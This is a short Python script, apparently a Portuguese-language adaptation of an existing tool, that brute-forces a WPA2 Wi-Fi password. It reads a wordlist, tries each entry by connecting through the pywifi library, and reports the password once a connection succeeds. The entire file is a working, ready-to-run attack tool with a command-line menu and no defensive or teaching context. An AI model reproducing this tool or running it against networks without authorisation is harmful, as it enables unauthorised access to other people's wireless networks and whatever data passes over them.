#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import platform
import time

try:
    import pywifi
    from pywifi import PyWiFi, const, Profile
except Exception as e:
    print("Erro real ao importar pywifi:")
    print(e)
    sys.exit(1)


RED   = "\033[1;31m"
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD  = "\033[;1m"


# Inicializa WiFi
try:
    wifi = PyWiFi()
    interfaces = wifi.interfaces()

    if not interfaces:
        print("[-] Nenhuma interface WiFi encontrada.")
        sys.exit(1)

    iface = interfaces[0]

except Exception as e:
    print(f"[-] Erro ao inicializar WiFi: {e}")
    sys.exit(1)


def connect_wifi(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(2)  # tempo maior para conexão

    if iface.status() == const.IFACE_CONNECTED:
        print(BOLD + GREEN + "\n[*] Crack success!" + RESET)
        print(BOLD + GREEN + f"[*] Password is: {password}" + RESET)
        sys.exit(0)
    else:
        print(RED + f"[{number}] Crack Failed using: {password}" + RESET)


def start_attack(ssid, wordlist):
    number = 0
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            number += 1
            password = line.strip()
            if password:
                connect_wifi(ssid, password, number)


def menu():
    parser = argparse.ArgumentParser(description="WiFi Bruteforce Tool")
    parser.add_argument('-s', '--ssid', type=str, help='SSID (Nome da rede)')
    parser.add_argument('-w', '--wordlist', type=str, help='Wordlist')
    parser.add_argument('-v', '--version', action='store_true', help='Versão')

    args = parser.parse_args()

    print(CYAN + "[+] Sistema: " + BOLD +
          f"{platform.system()} {platform.machine()}" + RESET)
    time.sleep(1)

    if args.version:
        print("\nby Brahim Jarrar")
        print("GitHub: https://github.com/BrahimJarrar/")
        print("Copyright 2019\n")
        sys.exit(0)

    ssid = args.ssid
    wordlist = args.wordlist

    if not ssid:
        ssid = input("[*] SSID: ")

    if not wordlist:
        wordlist = input("[*] Wordlist: ")

    if not os.path.exists(wordlist):
        print(RED + "[-] Wordlist não encontrada." + RESET)
        sys.exit(1)

    os.system("cls" if platform.system().lower().startswith("win") else "clear")
    print(BLUE + "[~] Cracking..." + RESET)

    start_attack(ssid, wordlist)


if __name__ == "__main__":
    menu()